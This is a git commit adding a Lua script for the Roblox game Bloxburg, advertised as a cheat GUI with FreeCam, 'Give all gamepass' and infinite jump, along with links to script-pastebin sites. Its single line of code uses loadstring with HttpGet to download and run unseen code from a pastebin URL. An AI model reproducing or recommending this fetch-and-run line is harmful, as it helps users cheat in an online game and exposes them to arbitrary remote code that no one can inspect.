867a6120c6bfca4ca12ccd528116e269832325f7
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-24 05:30:01 +0100

    commit zero

---
+++ BloxBurg Script pastebin roblox BloxBurg Gui .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet('https://pastebin.com/raw/08NczYih'))()
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							The Bloxburg script is awesome, it has FreeCam, Give all gamepass, inf jump and more!
+						
+]]
